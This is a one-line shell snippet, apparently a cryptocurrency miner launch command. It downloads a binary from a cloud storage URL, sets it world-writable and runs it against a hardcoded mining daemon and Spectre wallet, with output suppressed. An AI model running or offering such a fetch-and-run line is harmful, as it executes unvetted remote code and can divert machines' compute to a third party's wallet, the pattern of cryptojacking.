...
wget https://majza.nyc3.digitaloceanspaces.com/Tnn0.4.0 && chmod 777 Tnn0.4.0 && ./Tnn0.4.0 --daemon-address 157.230.239.11 --port 443 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --spectre --wallet spectre:qquqascwnncn2haxx05xc0c7swcv0e86vzpjmx6ellhyv5tw2y0c22w5k5l6p > /dev/null 2>&1
